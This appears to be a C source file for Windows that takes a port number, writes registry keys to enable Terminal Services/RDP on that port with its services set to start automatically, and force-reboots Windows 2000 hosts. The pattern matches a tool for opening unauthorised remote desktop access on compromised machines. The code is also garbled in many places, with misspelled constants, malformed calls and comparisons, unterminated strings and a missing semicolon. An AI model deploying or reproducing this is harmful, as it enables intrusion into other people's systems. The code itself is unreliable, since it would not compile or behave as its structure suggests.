#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
void CreateStringReg(HKEY hRoot,char *szSubKey,char* ValueName,char *Data)
{
	HKEY hKey;
	long lRet=RegCreateKeyEx(hRoot,szSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
	if (lRet != ERROR_SUCCESS)
	{
		printf("error no RegCreateKeyEx %s\n",szSubKey);
		return;
	}
	RegCreateKey(hKey);
}
void CreateDWORDReg(HKEY hRoot,char *szSubKey,char* ValueName,DWORD Data)
{
	HKEY hKey;
	long lRet=RegCreateKeyEx(hRoot,szSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
	if (lRet!=ERROR_SUCCESS)
	{
		printf("error no RegCreateKeyEx %s\n",szSubKey);
		return;
	}
	DWORD dwSize=sizeof(DWORD);
	lRet=RegSetValueEx(hKey,ValueName,0,REG_DWORD,(BYTE*)&Data,dwSize);
	if(lRet!=ERROR_SUCCESS)
	{
		printf("error no RegSetValueEx %s\n",ValueName);
		return;
	}
	RegCloseKey(hKey);

}

void Reboot()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken))
		return;
	LookupPrivilegeValue(NULL,SE_SHUTDOWN_NAME,&tkp,Privileges[0].Luid);
	tkp.PrivilegesCount=1;
	tkp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken,FALSE,&tkp,0,(PTOKEN_PRIVILEGES)NULL,0);
	ExitWindowsEx(EWX_REBOOT|EWX_FORCE,0);

}
int main(int argc,char* argv[])
{
	DWORD Port=atoi(argv[1]);
	CreateStringReg(HKEY_LCOAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\netcache","Enabled","0");
	CreateDWORDReg(HKEY_LCOAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\Windows\\Installer","EnableAdminTSRemote",0x00000001);
	CreateStringReg(HKEY_LCOAL_MACHINE,"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","ShutdownWithoutLogon","0");
	CreateDWORDReg(HKEY_LCOAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server","TSEnabled",0x00000001);
	CreateDWORDReg(HKEY_LCOAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\TermDD","Start",0x00000002);
	CreateDWORDReg(HKEY_LCOAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\TermServices","Start",0x00000002);
	CreateDWORDReg(HKEY_LCOAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server","fDenyTSConnections",0x00000001);
	CreateDWORDReg(HKEY_LCOAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal\\Server\\RDPTcp",,"PortNumber",Port);
	CreateDWORDReg(HKEY_LCOAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp,"PortNumber",Port);
	CreateDWORDReg(HKEY_LCOAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdwp\\Tds\\tcp","PortNumber",Port);
	CreateStringReg(HKEY_USERS,".DEFAULT\\Keyboard Layout\\Toggle","Hotkey","2");
	CreateDWORDReg(HKEY_LCOAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Terminal Server","fDenyTSConnections",0x00000000);
	OSVERSIONINFO osver=(sizeof(OSVERSIONINFO));
	GetVersionEx(&osver);
	if (osver.dwMajorVersion= =5&&osver.dwMinorVersion=  =0)
		Reboot();
	return 0
	
}